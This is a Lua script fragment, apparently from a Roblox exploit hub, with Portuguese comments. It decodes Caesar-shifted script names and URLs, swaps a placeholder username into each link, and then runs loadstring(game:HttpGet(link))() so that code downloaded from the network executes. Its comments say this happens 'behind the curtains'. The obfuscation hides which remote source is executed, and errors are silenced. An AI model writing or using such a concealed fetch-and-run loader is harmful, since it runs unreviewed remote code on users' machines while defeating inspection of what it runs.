-- ============================================
-- SISTEMA DE DECRIPTAÇÃO (Cifra de César +9)
-- ============================================

local function _decrypt(text)
    local result = ""
    for i = 1, #text do
        local char = string.byte(text, i)
        if (char >= 97 and char <= 122) then
            char = char - 9
            if char < 97 then char = char + 26 end
        elseif (char >= 65 and char <= 90) then
            char = char - 9
            if char < 65 then char = char + 26 end
        elseif (char >= 48 and char <= 57) then
            char = char - 9
            if char < 48 then char = char + 10 end
        end
        result = result .. string.char(char)
    end
    return result
end

-- ============================================
-- SISTEMA DE SUBSTITUIÇÃO (ZQHENS → function-fin)
-- ============================================

local function _replaceUser(link)
    local fake = "ZQHENS"
    local real = "function-fin"
    if string.find(link, fake) then
        return string.gsub(link, fake, real)
    end
    return link
end

-- ============================================
-- FUNÇÃO DE EXECUÇÃO (TUDO POR TRÁS DAS CORTINAS)
-- ============================================

local function _executeScript(encryptedName, encryptedLink)
    PlayClickSound()
    
    -- PASSO 1: Decriptar o nome e o link
    local name = _decrypt(encryptedName)
    local link = _decrypt(encryptedLink)
    
    -- PASSO 2: Substituir o usuário
    link = _replaceUser(link)
    
    -- PASSO 3: Executar a loadstring
    local success, err = pcall(function()
        loadstring(game:HttpGet(link))()
    end)
    
    if not success then
        warn("Erro ao executar " .. name .. ": " .. tostring(err))
    end
end

